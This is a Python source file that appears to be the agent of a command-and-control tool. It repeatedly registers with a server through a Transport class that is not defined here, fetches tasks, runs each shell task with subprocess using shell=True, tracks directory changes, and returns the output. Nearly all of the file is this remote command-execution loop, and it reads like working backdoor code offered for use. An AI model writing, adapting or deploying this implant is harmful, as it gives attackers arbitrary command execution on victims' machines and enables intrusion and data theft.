import os
import subprocess


def shell(parameters):
    cmd = parameters.strip()

    if cmd[:2].lower() == "cd":
        change_dir = cmd[2:].strip()
        try:
            os.chdir(change_dir)
            return f"[+] Changed to directory {change_dir}"
        except Exception as exc:
            return f"[-] Failed to change to directory {change_dir}: {exc}"

    result = subprocess.run(cmd, shell=True, capture_output=True)
    return (result.stdout + result.stderr).decode("utf-8", "ignore")


def main():
    while True:
        transport = Transport()
        while True:
            success = transport.register()
            if success:
                break

        while True:
            try:
                tasks = transport.get_tasks()
                if tasks is None:
                    break
                elif not tasks:
                    continue

                results = []
                for task in tasks:
                    task_type, task_parameters, task_id = (
                        task["task_type"],
                        task["task_data"],
                        task["task_id"],
                    )
                    try:
                        if task_type == "shell":
                            results.append(
                                {
                                    "result_type": "shell",
                                    "result_data": shell(task_parameters),
                                    "result_id": task_id,
                                },
                            )
                    except Exception as exc:
                        results.append(
                            {
                                "result_type": "error",
                                "result_data": {
                                    "error_message": f"[-] Failed to execute task {task_id}: {exc}",
                                    "task_type": task_type,
                                },
                                "result_id": task_id,
                            },
                        )
                success = transport.put_results(results)
                if not success:
                    break
            except Exception:
                break


if __name__ == "__main__":
    main()
